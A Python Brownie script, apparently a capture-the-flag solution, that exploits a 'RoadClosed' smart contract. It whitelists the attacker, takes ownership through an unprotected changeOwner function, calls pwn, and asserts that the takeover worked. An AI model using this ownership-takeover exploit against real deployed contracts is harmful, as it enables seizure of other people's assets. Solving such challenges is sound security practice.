#!/usr/bin/python3
from brownie import RoadClosed
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from colorama import Fore


# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack(contract_address=None, attacker=None):
    if not contract_address:
        target_contract, _ = deploy()
        _, attacker = get_account()
        contract_address = target_contract.address
    else:
        target_contract = RoadClosed.at(contract_address)
    
    # whitelist ourselves
    
    print(f"{green}Whitelisting our contract....{reset}")
    target_contract.addToWhitelist(attacker, {"from": attacker})

    
    # now call the `changeOwner` fn. be the owner of the contract
    
    print(f"{green}Calling the changeOwner function....{reset}")
    target_contract.changeOwner(attacker, {"from": attacker})

    # now call the `pwn(address address)` fn. to make the value of hacked `true`
    
    print(f"{green}Calling the pwn(address address) function....{reset}")
    target_contract.pwn(attacker, {"from": attacker})

    isOwner = target_contract.isOwner({"from": attacker})
    
    print(f"{blue}Checking the assert statement " + "'target_contract.isOwner({\"from\": attacker}) == True'")

    assert isOwner == True

    print(f"{green}Success....{reset}")
    print(f"{green}Attacker: {red}{attacker}{reset}")
    print(f"{green}Attacker is owner: {red}{isOwner}{reset}")


def main(contract_address=None):
    if contract_address:
        attack(contract_address, get_account())
    else:
        attack()

if __name__ == "__main__":
    main()